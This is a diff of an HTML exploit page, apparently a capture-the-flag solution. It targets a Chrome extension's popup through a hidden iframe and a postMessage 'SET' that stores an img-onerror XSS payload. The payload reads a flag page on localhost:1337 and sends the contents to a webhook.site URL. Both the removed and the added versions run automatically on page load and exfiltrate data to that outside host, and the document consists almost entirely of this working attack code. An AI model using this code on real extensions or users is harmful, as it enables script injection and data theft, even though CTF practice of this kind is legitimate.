@@ -1,70 +1,99 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
+<head><meta charset="utf-8"><title>Exploit (robust)</title></head>
 <body>
-    <h1>Please wait...</h1>
-    <p id="status">Loading...</p>
-    
-    <script>
-        // Configuration
-        const WEBHOOK = "https://webhook.site/05ba16cd-cf50-4eb3-89bd-43dfe2a61d6a";
-        const EXTENSION_ID = "bmmpcfceonpbmofjdlajmajopjgfdmal"; // Calculated from /app/TagDeprecater
-        
-        // Malicious payload to inject
-        const PAYLOAD = `<img src=x onerror="fetch('${WEBHOOK}/flag?data='+encodeURIComponent(document.body.innerHTML))">`;
-        
-        async function exploit() {
-            try {
-                document.getElementById('status').textContent = 'Loading extension popup...';
-                console.log('[*] Creating iframe to load popup.html');
-                
-                // Create iframe pointing to extension popup
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = `chrome-extension://${EXTENSION_ID}/popup.html`;
-                
-                // Wait for popup to load
-                iframe.onload = () => {
-                    console.log('[+] Popup loaded successfully!');
-                    document.getElementById('status').textContent = 'Injecting malicious payload...';
-                    
-                    // Send malicious payload via postMessage
-                    // popup.js has a message listener that will store this in chrome.storage
-                    iframe.contentWindow.postMessage({
-                        type: "SET",
-                        replacementString: PAYLOAD
-                    }, "*");
-                    
-                    console.log('[+] Payload sent to extension');
-                    document.getElementById('status').textContent = 'Payload injected! Redirecting...';
-                    
-                    // Wait a moment for chrome.storage to update, then redirect to flag server
-                    setTimeout(() => {
-                        console.log('[+] Redirecting to http://localhost:1337');
-                        window.location.href = 'http://localhost:1337';
-                    }, 1000);
-                };
-                
-                iframe.onerror = () => {
-                    console.log('[-] Failed to load extension popup');
-                    document.getElementById('status').textContent = 'Error loading extension';
-                };
-                
-                document.body.appendChild(iframe);
-                
-            } catch (error) {
-                console.error('[-] Exploit failed:', error);
-                document.getElementById('status').textContent = 'Exploit failed: ' + error.message;
-            }
+  <h1>Exploit in progress...</h1>
+  <pre id="log"></pre>
+
+<script>
+const WEBHOOK = "https://webhook.site/05ba16cd-cf50-4eb3-89bd-43dfe2a61d6a";
+const EXTENSION_ID = "bmmpcfceonpbmofjdlajmajopjgfdmal"; // your extension id
+const PAYLOAD = `<img src=x onerror="(async()=>{ try{ const t=await (await fetch('http://localhost:1337')).text(); const m=t.match(/<marquee>([^<]+)<\\/marquee>/); if(m) await fetch('${WEBHOOK}/flag?data='+encodeURIComponent(m[1])); }catch(e){ /* ignore */ } })()">`;
+
+const logEl = document.getElementById('log');
+function log(...args){ console.log(...args); logEl.textContent += args.join(' ') + '\n'; }
+
+// 1) quick network check: ping webhook
+async function testNetwork(){
+  try{
+    await fetch(WEBHOOK + '/ping', {method:'GET', mode:'no-cors'});
+    log('[*] Sent ping to webhook (may be no-cors). Check your webhook for a hit.');
+  }catch(e){
+    log('[-] Network ping failed:', e);
+  }
+}
+
+// 2) create iframe to popup, post SET and poll with GET until we get confirmation
+async function exploit() {
+  try{
+    log('[*] starting exploit');
+    await testNetwork();
+
+    // create hidden iframe
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = `chrome-extension://${EXTENSION_ID}/popup.html`;
+    document.body.appendChild(iframe);
+
+    // wait for iframe load (or timeout)
+    await new Promise(resolve => {
+      let done = false;
+      iframe.onload = () => { if(!done){ done=true; resolve(); } };
+      setTimeout(()=>{ if(!done){ done=true; resolve(); } }, 5000);
+    });
+    log('[*] iframe load attempted (may succeed even if onload didn't fire).');
+
+    // set up listener to catch REPLACEMENT_STRING replies from popup
+    let confirmed = false;
+    function onMessage(ev){
+      if (ev && ev.data && ev.data.type === 'REPLACEMENT_STRING') {
+        log('[+] popup replied REPLACEMENT_STRING:', ev.data.replacementString.slice(0,200));
+        if (ev.data.replacementString && ev.data.replacementString.includes('onerror')) {
+          confirmed = true;
         }
-        
-        // Start exploit when page loads
-        window.addEventListener('load', () => {
-            console.log('[*] Page loaded, starting exploit...');
-            exploit();
-        });
-    </script>
+      }
+    }
+    window.addEventListener('message', onMessage);
+
+    // post the SET
+    try {
+      iframe.contentWindow.postMessage({type:'SET', replacementString: PAYLOAD}, '*');
+      log('[*] posted SET to iframe');
+    } catch(e){
+      log('[-] postMessage SET failed:', e);
+    }
+
+    // poll with GET until we see REPLACEMENT_STRING or timeout
+    const maxChecks = 12;
+    for (let i=0;i<maxChecks && !confirmed;i++){
+      try {
+        iframe.contentWindow.postMessage({type:'GET'}, '*');
+        log('[*] posted GET to popup (attempt', i+1, '/', maxChecks, ')');
+      } catch(e){
+        log('[-] GET postMessage failed:', e);
+      }
+      await new Promise(r => setTimeout(r, 1000));
+    }
+
+    window.removeEventListener('message', onMessage);
+
+    if (!confirmed){
+      log('[-] popup did not confirm replacementString — aborting. Possible reasons: popup listener not reachable, wrong extension id, or browser blocked access.');
+      return;
+    }
+
+    log('[+] popup confirmed replacementString. Waiting 2s then navigating to flag page...');
+    await new Promise(r => setTimeout(r, 2000));
+    location.href = 'http://localhost:1337';
+
+  } catch (e) {
+    log('[-] exploit threw:', e);
+  }
+}
+
+window.addEventListener('load', () => {
+  exploit();
+});
+</script>
 </body>
 </html>
